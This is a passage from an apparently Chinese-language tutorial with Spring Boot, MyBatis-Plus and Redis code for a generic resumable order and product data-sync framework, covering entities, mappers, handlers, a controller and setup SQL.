        <span class="hljs-type">Boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().setIfAbsent(
                key, value, idempotent.expireTime(), java.util.concurrent.TimeUnit.SECONDS
        );
        <span class="hljs-keyword">if</span> (Boolean.FALSE.equals(success)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"当前数据正在同步，请勿重复操作"</span>);
        }

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> joinPoint.proceed();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// 正常执行完成后删除Key</span>
            redisTemplate.delete(key);
        }
    }
}
</code></pre>
<h5 data-id="heading-15">2.2.6 基础实体与服务</h5>
<h6 data-id="heading-16">同步任务实体（SyncTask）</h6>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.sync.entity;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.<span class="hljs-keyword">annotation</span>.IdType;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.<span class="hljs-keyword">annotation</span>.TableId;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.<span class="hljs-keyword">annotation</span>.TableName;
<span class="hljs-keyword">import</span> lombok.Data;

<span class="hljs-keyword">import</span> java.time.LocalDateTime;

<span class="hljs-comment">/**
 * 同步任务配置（持久化到MySQL）
 */</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@TableName(<span class="hljs-string">"sync_task"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncTask</span> {
    <span class="hljs-meta">@TableId(type = IdType.AUTO)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Long</span> id;
    <span class="hljs-keyword">private</span> String taskName;       <span class="hljs-comment">// 任务名称</span>
    <span class="hljs-keyword">private</span> String taskCode;       <span class="hljs-comment">// 任务编码（与bizCode一致）</span>
    <span class="hljs-keyword">private</span> String source;         <span class="hljs-comment">// 数据源</span>
    <span class="hljs-keyword">private</span> String target;         <span class="hljs-comment">// 目标源</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Long</span> lastBreakPoint;   <span class="hljs-comment">// 最终断点</span>
    <span class="hljs-keyword">private</span> Integer status;        <span class="hljs-comment">// 状态：0-未开始 1-同步中 2-已完成 3-异常</span>
    <span class="hljs-keyword">private</span> LocalDateTime createTime;
    <span class="hljs-keyword">private</span> LocalDateTime updateTime;
}
</code></pre>
<h6 data-id="heading-17">同步任务服务（SyncTaskService）</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.sync.service;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
<span class="hljs-keyword">import</span> com.example.sync.entity.SyncTask;
<span class="hljs-keyword">import</span> com.example.sync.mapper.SyncTaskMapper;
<span class="hljs-keyword">import</span> lombok.RequiredArgsConstructor;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-comment">/**
 * 同步任务配置服务（通用，所有业务复用）
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncTaskService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> SyncTaskMapper syncTaskMapper;

    <span class="hljs-comment">/**
     * 按业务编码查询任务
     */</span>
    <span class="hljs-keyword">public</span> SyncTask <span class="hljs-title function_">getSyncTaskByCode</span><span class="hljs-params">(String bizCode)</span> {
        <span class="hljs-keyword">return</span> syncTaskMapper.selectOne(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;SyncTask&gt;()
                .eq(SyncTask::getTaskCode, bizCode));
    }

    <span class="hljs-comment">/**
     * 更新任务断点
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateTaskBreakPoint</span><span class="hljs-params">(String bizCode, Long breakPoint)</span> {
        <span class="hljs-type">SyncTask</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> getSyncTaskByCode(bizCode);
        <span class="hljs-keyword">if</span> (task == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"同步任务不存在："</span> + bizCode);
        }
        task.setLastBreakPoint(breakPoint);
        task.setUpdateTime(LocalDateTime.now());
        syncTaskMapper.updateById(task);
    }

    <span class="hljs-comment">/**
     * 更新任务状态
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateTaskStatus</span><span class="hljs-params">(String bizCode, Integer status)</span> {
        <span class="hljs-type">SyncTask</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> getSyncTaskByCode(bizCode);
        <span class="hljs-keyword">if</span> (task == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"同步任务不存在："</span> + bizCode);
        }
        task.setStatus(status);
        task.setUpdateTime(LocalDateTime.now());
        syncTaskMapper.updateById(task);
    }
}
</code></pre>
<h6 data-id="heading-18">同步任务Mapper（SyncTaskMapper）</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.sync.mapper;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;
<span class="hljs-keyword">import</span> com.example.sync.entity.SyncTask;
<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Mapper;

<span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SyncTaskMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseMapper</span>&lt;SyncTask&gt; {
}
</code></pre>
<h5 data-id="heading-19">2.2.7 业务实现示例（订单+商品）</h5>
<h6 data-id="heading-20">订单实体（OrderDO）</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.sync.entity;

<span class="hljs-keyword">import</span> lombok.Data;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;

<span class="hljs-comment">/**
 * 订单业务实体
 */</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderDO</span> {
    <span class="hljs-keyword">private</span> Long id;             <span class="hljs-comment">// 主键（断点标识）</span>
    <span class="hljs-keyword">private</span> String orderNo;      <span class="hljs-comment">// 订单号</span>
    <span class="hljs-keyword">private</span> BigDecimal amount;   <span class="hljs-comment">// 金额</span>
    <span class="hljs-keyword">private</span> LocalDateTime createTime;
    <span class="hljs-keyword">private</span> Integer syncStatus;  <span class="hljs-comment">// 同步状态：0-未同步 1-已同步</span>
}
</code></pre>
<h6 data-id="heading-21">订单数据源实现（OrderSyncDataSource）</h6>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.sync.biz.order;

<span class="hljs-keyword">import</span> com.example.sync.core.SyncDataSource;
<span class="hljs-keyword">import</span> com.example.sync.entity.OrderDO;
<span class="hljs-keyword">import</span> com.example.sync.mapper.OrderMapper;
<span class="hljs-keyword">import</span> lombok.RequiredArgsConstructor;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * 订单同步数据源（实现通用接口，仅写订单相关查询逻辑）
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderSyncDataSource</span> <span class="hljs-title">implements</span> <span class="hljs-title">SyncDataSource</span>&lt;<span class="hljs-type">OrderDO</span>&gt; {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderMapper orderMapper;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;OrderDO&gt; selectWaitSyncData(<span class="hljs-built_in">Long</span> lastBreakPoint, Integer batchSize) {
        <span class="hljs-comment">// 订单业务的查询逻辑：按断点ID查询待同步订单</span>
        <span class="hljs-keyword">return</span> orderMapper.selectWaitSyncOrder(lastBreakPoint, batchSize);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> void batchUpdateSyncStatus(List&lt;<span class="hljs-built_in">Long</span>&gt; dataIds, Integer syncStatus) {
        <span class="hljs-comment">// 订单业务的状态更新逻辑</span>
        orderMapper.batchUpdateSyncStatus(dataIds, syncStatus);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">Long</span> getDataId(OrderDO <span class="hljs-keyword">data</span>) {
        <span class="hljs-comment">// 订单的断点标识是ID</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>.getId();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String getBizCode() {
        <span class="hljs-comment">// 订单业务编码</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"order_sync"</span>;
    }
}
</code></pre>
<h6 data-id="heading-22">订单同步处理器（OrderSyncHandler）</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.sync.biz.order;

<span class="hljs-keyword">import</span> com.example.sync.annotation.Idempotent;
<span class="hljs-keyword">import</span> com.example.sync.core.SyncHandler;
<span class="hljs-keyword">import</span> com.example.sync.entity.OrderDO;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * 订单同步处理器（实现通用接口，仅写订单同步逻辑）
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderSyncHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SyncHandler</span>&lt;OrderDO&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-meta">@Idempotent(prefix = "order_sync_", expireTime = 300)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncToTarget</span><span class="hljs-params">(List&lt;OrderDO&gt; dataList)</span> {
        <span class="hljs-comment">// 订单业务的同步逻辑：调用Feign接口同步到仓储服务（示例）</span>
        log.info(<span class="hljs-string">"同步{}条订单数据到仓储服务：{}"</span>, dataList.size(), 
                dataList.stream().map(OrderDO::getOrderNo).toList());
        <span class="hljs-comment">// 实际代码：orderFeignClient.syncOrderData(dataList);</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getBizCode</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"order_sync"</span>;
    }
}
</code></pre>
<h6 data-id="heading-23">订单Mapper（OrderMapper）</h6>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">package</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sync</span><span class="hljs-selector-class">.mapper</span>;

<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.baomidou</span><span class="hljs-selector-class">.mybatisplus</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.mapper</span><span class="hljs-selector-class">.BaseMapper</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sync</span><span class="hljs-selector-class">.entity</span><span class="hljs-selector-class">.OrderDO</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.annotations</span><span class="hljs-selector-class">.Mapper</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.annotations</span><span class="hljs-selector-class">.Param</span>;

<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.List</span>;

@<span class="hljs-selector-tag">Mapper</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">interface</span> <span class="hljs-selector-tag">OrderMapper</span> <span class="hljs-selector-tag">extends</span> <span class="hljs-selector-tag">BaseMapper</span>&lt;<span class="hljs-selector-tag">OrderDO</span>&gt; {
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">OrderDO</span>&gt; <span class="hljs-selector-tag">selectWaitSyncOrder</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">"lastId"</span>) Long lastId, <span class="hljs-variable">@Param</span>(<span class="hljs-string">"batchSize"</span>) Integer batchSize);
    <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">batchUpdateSyncStatus</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">"ids"</span>) List&lt;Long&gt; ids, <span class="hljs-variable">@Param</span>(<span class="hljs-string">"syncStatus"</span>) Integer syncStatus);
}
</code></pre>
<h6 data-id="heading-24">订单Mapper XML（OrderMapper.xml）</h6>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="hljs-string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">"com.example.sync.mapper.OrderMapper"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectWaitSyncOrder"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"com.example.sync.entity.OrderDO"</span>&gt;</span>
        SELECT id, order_no, amount, create_time, sync_status
        FROM order_table
        WHERE id &gt; #{lastId} AND sync_status = 0
        ORDER BY id ASC LIMIT #{batchSize}
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"batchUpdateSyncStatus"</span>&gt;</span>
        UPDATE order_table SET sync_status = #{syncStatus}
        WHERE id IN
        <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">"ids"</span> <span class="hljs-attr">item</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">open</span>=<span class="hljs-string">"("</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">","</span> <span class="hljs-attr">close</span>=<span class="hljs-string">")"</span>&gt;</span>
            #{id}
        <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>
</code></pre>
<h6 data-id="heading-25">商品实体（ProductDO）</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.sync.entity;

<span class="hljs-keyword">import</span> lombok.Data;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;

<span class="hljs-comment">/**
 * 商品业务实体
 */</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductDO</span> {
    <span class="hljs-keyword">private</span> Long id;             <span class="hljs-comment">// 主键（断点标识）</span>
    <span class="hljs-keyword">private</span> String productNo;    <span class="hljs-comment">// 商品编码</span>
    <span class="hljs-keyword">private</span> String productName;  <span class="hljs-comment">// 商品名称</span>
    <span class="hljs-keyword">private</span> BigDecimal price;    <span class="hljs-comment">// 价格</span>
    <span class="hljs-keyword">private</span> LocalDateTime createTime;
    <span class="hljs-keyword">private</span> Integer syncStatus;  <span class="hljs-comment">// 同步状态：0-未同步 1-已同步</span>
}
</code></pre>
<h6 data-id="heading-26">商品数据源实现（ProductSyncDataSource）</h6>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.sync.biz.product;

<span class="hljs-keyword">import</span> com.example.sync.core.SyncDataSource;
<span class="hljs-keyword">import</span> com.example.sync.entity.ProductDO;
<span class="hljs-keyword">import</span> com.example.sync.mapper.ProductMapper;
<span class="hljs-keyword">import</span> lombok.RequiredArgsConstructor;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * 商品同步数据源（实现通用接口，仅写商品相关查询逻辑）
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductSyncDataSource</span> <span class="hljs-title">implements</span> <span class="hljs-title">SyncDataSource</span>&lt;<span class="hljs-type">ProductDO</span>&gt; {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ProductMapper productMapper;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;ProductDO&gt; selectWaitSyncData(<span class="hljs-built_in">Long</span> lastBreakPoint, Integer batchSize) {
        <span class="hljs-comment">// 商品业务的查询逻辑</span>
        <span class="hljs-keyword">return</span> productMapper.selectWaitSyncProduct(lastBreakPoint, batchSize);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> void batchUpdateSyncStatus(List&lt;<span class="hljs-built_in">Long</span>&gt; dataIds, Integer syncStatus) {
        <span class="hljs-comment">// 商品业务的状态更新逻辑</span>
        productMapper.batchUpdateSyncStatus(dataIds, syncStatus);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">Long</span> getDataId(ProductDO <span class="hljs-keyword">data</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>.getId();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String getBizCode() {
        <span class="hljs-comment">// 商品业务编码</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"product_sync"</span>;
    }
}
</code></pre>
<h6 data-id="heading-27">商品同步处理器（ProductSyncHandler）</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.sync.biz.product;

<span class="hljs-keyword">import</span> com.example.sync.annotation.Idempotent;
<span class="hljs-keyword">import</span> com.example.sync.core.SyncHandler;
<span class="hljs-keyword">import</span> com.example.sync.entity.ProductDO;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * 商品同步处理器（实现通用接口，仅写商品同步逻辑）
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductSyncHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SyncHandler</span>&lt;ProductDO&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-meta">@Idempotent(prefix = "product_sync_", expireTime = 300)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncToTarget</span><span class="hljs-params">(List&lt;ProductDO&gt; dataList)</span> {
        <span class="hljs-comment">// 商品业务的同步逻辑：调用Feign接口同步到商城服务（示例）</span>
        log.info(<span class="hljs-string">"同步{}条商品数据到商城服务：{}"</span>, dataList.size(),
                dataList.stream().map(ProductDO::getProductNo).toList());
        <span class="hljs-comment">// 实际代码：productFeignClient.syncProductData(dataList);</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getBizCode</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"product_sync"</span>;
    }
}
</code></pre>
<h6 data-id="heading-28">商品Mapper（ProductMapper）</h6>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">package</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sync</span><span class="hljs-selector-class">.mapper</span>;

<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.baomidou</span><span class="hljs-selector-class">.mybatisplus</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.mapper</span><span class="hljs-selector-class">.BaseMapper</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sync</span><span class="hljs-selector-class">.entity</span><span class="hljs-selector-class">.ProductDO</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.annotations</span><span class="hljs-selector-class">.Mapper</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.annotations</span><span class="hljs-selector-class">.Param</span>;

<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.List</span>;

@<span class="hljs-selector-tag">Mapper</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">interface</span> <span class="hljs-selector-tag">ProductMapper</span> <span class="hljs-selector-tag">extends</span> <span class="hljs-selector-tag">BaseMapper</span>&lt;<span class="hljs-selector-tag">ProductDO</span>&gt; {
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">ProductDO</span>&gt; <span class="hljs-selector-tag">selectWaitSyncProduct</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">"lastId"</span>) Long lastId, <span class="hljs-variable">@Param</span>(<span class="hljs-string">"batchSize"</span>) Integer batchSize);
    <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">batchUpdateSyncStatus</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">"ids"</span>) List&lt;Long&gt; ids, <span class="hljs-variable">@Param</span>(<span class="hljs-string">"syncStatus"</span>) Integer syncStatus);
}
</code></pre>
<h6 data-id="heading-29">商品Mapper XML（ProductMapper.xml）</h6>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="hljs-string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">"com.example.sync.mapper.ProductMapper"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectWaitSyncProduct"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"com.example.sync.entity.ProductDO"</span>&gt;</span>
        SELECT id, product_no, product_name, price, create_time, sync_status
        FROM product_table
        WHERE id &gt; #{lastId} AND sync_status = 0
        ORDER BY id ASC LIMIT #{batchSize}
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"batchUpdateSyncStatus"</span>&gt;</span>
        UPDATE product_table SET sync_status = #{syncStatus}
        WHERE id IN
        <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">"ids"</span> <span class="hljs-attr">item</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">open</span>=<span class="hljs-string">"("</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">","</span> <span class="hljs-attr">close</span>=<span class="hljs-string">")"</span>&gt;</span>
            #{id}
        <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>
</code></pre>
<h5 data-id="heading-30">2.2.8 控制器（通用接口）</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.sync.controller;

<span class="hljs-keyword">import</span> com.example.sync.core.GenericSyncTemplate;
<span class="hljs-keyword">import</span> com.example.sync.core.SyncContext;
<span class="hljs-keyword">import</span> lombok.RequiredArgsConstructor;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.GetMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.PathVariable;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RequestMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;

<span class="hljs-comment">/**
 * 通用同步控制器（所有业务复用同一个接口）
 */</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(<span class="hljs-string">"/sync"</span>)</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncController</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> GenericSyncTemplate genericSyncTemplate;

    <span class="hljs-comment">/**
     * 启动/恢复任意业务的同步任务
     * <span class="hljs-doctag">@param</span> bizCode 业务编码（order_sync/product_sync）
     * <span class="hljs-doctag">@return</span> 响应信息
     */</span>
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/start/{bizCode}"</span>)</span>
    <span class="hljs-keyword">public</span> String startSync(<span class="hljs-meta">@PathVariable</span> String bizCode) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 构建同步上下文（仅需传入业务编码，其他用默认配置）</span>
            SyncContext context = new SyncContext().setBizCode(bizCode);
            genericSyncTemplate.startOrResumeSync(context);
            <span class="hljs-keyword">return</span> <span class="hljs-string">"业务["</span> + bizCode + <span class="hljs-string">"]同步任务启动/恢复成功"</span>;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"业务["</span> + bizCode + <span class="hljs-string">"]同步任务启动/恢复失败："</span> + e.getMessage();
        }
    }
}
</code></pre>
<h5 data-id="heading-31">2.2.9 启动类</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.sync;

<span class="hljs-keyword">import</span> org.mybatis.spring.<span class="hljs-keyword">annotation</span>.MapperScan;
<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;
<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;
<span class="hljs-keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;
<span class="hljs-keyword">import</span> org.springframework.cloud.openfeign.EnableFeignClients;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableDiscoveryClient</span> <span class="hljs-comment">// Nacos注册</span>
<span class="hljs-meta">@EnableFeignClients</span>    <span class="hljs-comment">// OpenFeign</span>
<span class="hljs-meta">@MapperScan(<span class="hljs-string">"com.example.sync.mapper"</span>)</span> <span class="hljs-comment">// MyBatis-Plus扫描</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncResumeGenericApplication</span> {
    <span class="hljs-keyword">public</span> static void main(String[] args) {
        SpringApplication.run(SyncResumeGenericApplication.<span class="hljs-keyword">class</span>, args);
    }
}
</code></pre>
<h4 data-id="heading-32">2.3 测试验证</h4>
<ol>
<li>
<p><strong>前置准备</strong>：</p>
<ol>
<li>
<p>创建MySQL数据库<code>sync_db</code>，执行以下建表语句：</p>
<ul>
<li>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 同步任务表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> sync_task (
    id <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
    task_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    task_code <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">UNIQUE</span>,
